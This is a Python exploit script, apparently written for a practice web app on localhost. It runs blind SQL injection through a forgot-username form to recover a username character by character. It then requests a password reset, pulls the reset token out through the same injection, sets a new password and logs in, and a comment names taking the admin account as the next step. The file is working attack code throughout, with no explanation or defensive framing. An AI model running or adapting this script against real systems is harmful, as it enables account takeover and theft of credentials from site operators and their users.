import requests
import string
import json

MAX_USERNAME_LENGTH = 30
ALPHANUM = string.ascii_letters + string.digits + '_'
URL = "http://localhost:8080"

def get_username_length():
    i = 1
    while i <= MAX_USERNAME_LENGTH:
        print(f"Trying for {i}")
        payload = f"' OR username=(SELECT username FROM users WHERE LENGTH(username)={i} ORDER BY username DESC LIMIT 1) --"
        data = {"username": payload}
        response = requests.post(URL + "/forgotusername.php", data=data)
        
        if "exists" in response.text.lower():
            print(f"Username length found: {i}")
            return i
        i += 1
    return i

def get_username(length):
    username = ""
    for pos in range(length):
        for char in ALPHANUM:
            payload = f"' OR username=(SELECT username FROM users WHERE LENGTH(username)={length} ORDER BY username DESC LIMIT 1) AND username LIKE '{username}{char}%' --"
            data = {"username": payload}
            response = requests.post(URL + "/forgotusername.php", data=data)
            
            if "exists" in response.text.lower():
                username += char
                print(f"Found character {pos + 1}: {char}")
                break

    print(f"Username discovered: {username}")
    return username
    
def reset_password(username, password):
    data = {"username": username}
    requests.post(URL + "/forgotpassword.php", data=data)
    token = get_token(username)
    data = {
        "token": token,
        "password1": password,
        "password2": password
    }
    response = requests.post(URL + "/resetpassword.php", data=data)
    if "changed" in response.text.lower():
        print(f"Password has been reset to {password}")
    else:
        print("Error: couldn't change password")

def get_token(username):
    token = ""
    for pos in range(32):
        for char in ALPHANUM:
            payload = f"{username}' and (SELECT token FROM users u, tokens t WHERE u.username='{username}' and u.uid=t.uid ORDER BY t.token DESC LIMIT 1) LIKE '{token}{char}%' --"
            data = {"username": payload}
            response = requests.post(URL + "/forgotusername.php", data=data)
            
            if "exists" in response.text.lower():
                token += char
                print(f"Found character {pos + 1}: {char}")
                break
    print(f"Token discovered: {token}")
    return token

if __name__ == "__main__":

    file_path = "values.json"
    with open(file_path, "r") as f:
        data = json.load(f)

    if data["username"] == "":
        username_length = get_username_length()
        assert username_length <= MAX_USERNAME_LENGTH
        data["username"] = get_username(username_length)
        reset_password(data["username"], data["password"])
        with open(file_path, "w") as f:
            json.dump(data, f, indent=4)

    session = requests.Session()
    response = session.post(URL + "/login.php", data=data)

    #print(response.text)

    if "failed" in response.text.lower():
        print("Login failed")
    else:
        print("Logged in!")
        #TODO: get admin account
